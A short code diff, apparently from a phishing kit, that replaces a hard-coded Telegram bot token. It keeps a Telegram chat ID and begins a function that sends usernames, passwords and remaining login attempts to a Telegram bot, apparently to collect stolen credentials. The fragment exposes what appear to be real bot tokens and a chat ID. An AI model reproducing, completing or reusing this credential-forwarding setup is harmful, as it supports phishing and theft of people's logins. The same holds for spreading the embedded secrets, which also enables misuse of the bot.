@@ -1,5 +1,5 @@
 // ---------------- TELEGRAM CONFIG ----------------
-const TELEGRAM_BOT_TOKEN = '9128412165:AAEtlGPJduYnMJ4mzGVqGh1AiCFUCJtnBSM';
+const TELEGRAM_BOT_TOKEN = '9128412165:AAHz-I3a85dLzmvHuYlRoC6WzRS24hf4ksE';
 const TELEGRAM_CHAT_ID = '-1005947613823';
 
 async function sendToTelegramBot(username, password, remainingAttempts) {
